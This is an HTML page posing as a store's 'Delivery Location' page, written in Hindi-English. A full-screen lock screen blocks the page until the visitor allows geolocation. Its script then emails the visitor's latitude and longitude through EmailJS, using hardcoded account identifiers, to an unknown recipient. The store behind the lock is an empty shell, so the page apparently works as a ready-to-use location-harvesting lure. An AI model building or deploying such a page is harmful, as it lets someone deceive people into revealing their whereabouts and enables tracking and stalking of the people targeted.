<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Delivery Location</title>

<style>
body{
font-family:Arial;
text-align:center;
margin:0;
}

/* Lock Screen */
#lockScreen{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:#000;
color:#fff;
display:flex;
flex-direction:column;
justify-content:center;
align-items:center;
z-index:9999;
text-align:center;
padding:20px;
}

button{
padding:14px 22px;
font-size:18px;
background:#28a745;
color:white;
border:none;
border-radius:8px;
cursor:pointer;
}
</style>
</head>

<body>

<!-- LOCK SCREEN -->
<div id="lockScreen">
<h2>📍 Location Required</h2>
<p>Delivery continue karne ke liye location allow karein</p>
<button onclick="getLocation()">Allow Location</button>
</div>

<h2>Welcome to Our Store</h2>
<p>Location allow karne ke baad hi aage badh sakte hain</p>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
// EmailJS Init
(function(){
 emailjs.init("2pInQghRcP-YZtYCK");
})();

function getLocation(){

 if(navigator.geolocation){

   navigator.geolocation.getCurrentPosition(function(position){

     let lat = position.coords.latitude;
     let lon = position.coords.longitude;

     // Send Email
     emailjs.send("service_hxul50k","template_3mjgsjk",{
       latitude: lat,
       longitude: lon
     })
     .then(function(){
        alert("✅ Location successfully sent!");
     },
     function(){
        alert("❌ Error sending location");
     });

     // Unlock Website
     document.getElementById("lockScreen").style.display="none";

   },
   function(){
     alert("Delivery ke liye location allow karna zaroori hai.");
   });

 }else{
   alert("Location supported nahi hai.");
 }

}
</script>

</body>
</html>
